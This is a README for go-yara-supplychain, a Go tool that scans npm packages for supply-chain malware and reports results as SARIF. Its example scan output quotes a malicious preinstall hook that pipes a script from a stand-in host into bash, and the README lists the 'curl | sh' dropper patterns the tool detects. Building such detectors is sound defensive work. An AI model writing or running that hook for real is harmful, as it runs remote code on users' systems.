# go-yara-supplychain

[![CI](https://github.com/cawalch/go-yara-supplychain/actions/workflows/ci.yml/badge.svg)](https://github.com/cawalch/go-yara-supplychain/actions/workflows/ci.yml)
[![Go Reference](https://pkg.go.dev/badge/github.com/cawalch/go-yara-supplychain.svg)](https://pkg.go.dev/github.com/cawalch/go-yara-supplychain)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)

High-confidence, sub-second supply chain malware detection engine for software ecosystems. Built in pure Go (zero CGO) on top of [`cawalch/go-yara`](https://github.com/cawalch/go-yara).

Designed specifically to solve the false-positive paradox in package registries: **pure signature scanners drown in false alarms on legitimate build scripts (`esbuild`, `node-gyp`, `sharp`), while missing malicious install hooks (`curl | bash`).**

---

## Key Features

- **Sub-Second Throughput**: Scans thousands of files in under $100\text{ ms}$ with zero runtime overhead or external daemon dependencies.
- **Contextual Disambiguation Engine**:
  - Automatically identifies legitimate native binary fetchers (`esbuild`, `swc`, `sharp`, `sqlite3`) verifying SHA-256 integrity checksums against trusted domains (`registry.npmjs.org`, GitHub Releases).
  - Flags evasion droppers piping remote downloads into shell interpreters (`curl | sh`, `wget | bash`).
- **In-Memory AST De-obfuscation**:
  - Normalizes zero-width and invisible unicode characters (`U+200B`, `U+200C`, `U+FEFF`).
  - Folds string concatenations (`"c" + "h" + "i" + "l" + "d" + "_process"` -> `"child_process"`).
  - Decodes multi-layer Base64 payloads and `String.fromCharCode(...)` arrays prior to signature matching.
- **SARIF 2.1.0 & CI/CD Native**: Direct integration with GitHub Security Tab / Code Scanning alerts.
- **Pure Go (Zero CGO)**: Compiles instantly, cross-compiles without toolchains, runs in minimal scratch/distroless containers.

---

## Installation

### CLI

Install the standalone scanner binary:

```bash
go install github.com/cawalch/go-yara-supplychain/cmd/go-yara-supplychain@latest
```

Or run directly without installing:

```bash
go run github.com/cawalch/go-yara-supplychain/cmd/go-yara-supplychain@latest .
```

### GitHub Action

Add `go-yara-supplychain` to your `.github/workflows/ci.yml`:

```yaml
name: Supply Chain Security Guard
on: [push, pull_request]

jobs:
  supplychain-scan:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@v4

      - name: Scan Dependencies
        uses: cawalch/go-yara-supplychain@main
        with:
          path: '.'
          sarif-file: 'supplychain.sarif'
          fail-on-critical: 'true'

      - name: Upload SARIF to GitHub Security Tab
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'supplychain.sarif'
```

---

## CLI Usage

```text
Usage of go-yara-supplychain:
  go-yara-supplychain [flags] [path...]

Flags:
  --sarif string
        Path to write SARIF 2.1.0 report
  --json
        Output results in JSON format
  --ndjson
        Output results in NDJSON format
  --fail-on-critical
        Exit with code 1 if CRITICAL supply chain threats are detected (default true)
  --fail-on-warn
        Exit with code 1 if HIGH or MEDIUM threats are detected (default false)
  --no-color
        Disable colored terminal output
  --version
        Print version and exit
```

### Example Terminal Output

```text
=== go-yara-supplychain Security Scan Results ===

[CRITICAL - BLOCK] @chalk-worm (score: 1.00)
  Path: ./packages/chalk-worm
  Findings (2):
    - [CRITICAL] Install hook 'preinstall' pipes remote content directly to shell interpreter: curl -sL https://malware-feed.biz/sh | bash (package.json)
      Code: curl -sL https://malware-feed.biz/sh | bash
    - [CRITICAL] Remote script download piped directly to shell (package.json)
      Code: curl -sL https://malware-feed.biz/sh | bash

[BENIGN - PASS] @esbuild (score: 0.00)
  Path: ./packages/esbuild

Summary: 2 packages scanned | 1 passed | 1 critical | 0 high | 0 medium
```

---

## Go API Usage

You can embed the analyzer engine directly inside your Go microservices, registries, or ingestion pipelines:

```go
package main

import (
	"fmt"
	"log"

	"github.com/cawalch/go-yara-supplychain/pkg/analyzer"
	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/npm"
)

func main() {
	// Initialize compiled multi-stage rule engine
	engine, err := analyzer.NewEngine()
	if err != nil {
		log.Fatal(err)
	}

	// Parse npm package directory
	pkg, err := npm.ParsePackageDir("./node_modules/example-pkg")
	if err != nil {
		log.Fatal(err)
	}

	// Analyze package
	verdict, err := engine.AnalyzePackage(pkg)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("Package: %s@%s\n", verdict.PackageName, verdict.PackageVersion)
	fmt.Printf("Risk Level: %s (Action: %s, Score: %.2f)\n",
		verdict.RiskLevel, verdict.Action, verdict.ConfidenceScore)

	for _, item := range verdict.Evidence {
		fmt.Printf("  - [%s] %s: %s\n", item.Severity, item.RuleID, item.Description)
	}
}
```

---

## Architecture

```text
                  Package Directory / Tarball
                              │
                              ▼
                 npm Package Manifest Parser
                 (package.json, hooks, source)
                              │
             ┌────────────────┴────────────────┐
             ▼                                 ▼
   Lifecycle Hook Analyzer           In-Memory De-obfuscator
   - Detects piped shell droppers    - Invisible unicode stripping
   - Whitelists node-gyp / esbuild   - String concatenation folding
             │                       - Base64 payload decoding
             │                                 │
             └────────────────┬────────────────┘
                              ▼
                   Contextual Disambiguation
                (Checksum & domain verification)
                              │
                              ▼
                    Pure-Go YARA Engine
               (Embedded supply chain rules)
                              │
                              ▼
                     Actionable Verdict
              (Pass, Warn, Block + SARIF 2.1.0)
```

---

## License

Apache License 2.0. See [LICENSE](LICENSE) for details.
